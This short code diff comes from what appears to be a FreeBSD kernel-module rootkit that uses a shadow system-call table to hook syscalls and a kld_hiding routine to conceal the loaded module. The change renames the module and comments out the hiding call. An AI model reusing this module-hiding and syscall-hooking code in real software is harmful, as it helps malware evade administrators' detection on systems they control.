@@ -9,8 +9,8 @@
 #include "kld_hiding.h"
 #include "shadow_sysent.h"
 
-#define KLD_NAME T_NAME"_shdw_sysent_tbl"
-#define KLD_FILE_NAME T_NAME"_shdw_sysent_tbl.ko"
+#define KLD_NAME T_NAME"_shdw"
+#define KLD_FILE_NAME T_NAME"_shdw.ko"
 
 struct shadow_sysent shadow_sysent[] = {
    {-1, NULL, NULL},
@@ -24,9 +24,9 @@ struct shadow_sysent shadow_sysent[] = {
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg)
 {
-#ifndef DEBUG
-   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
-#endif
+// #ifndef DEBUG
+//    kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
+// #endif
    int error = 0;
 
    switch (cmd) {
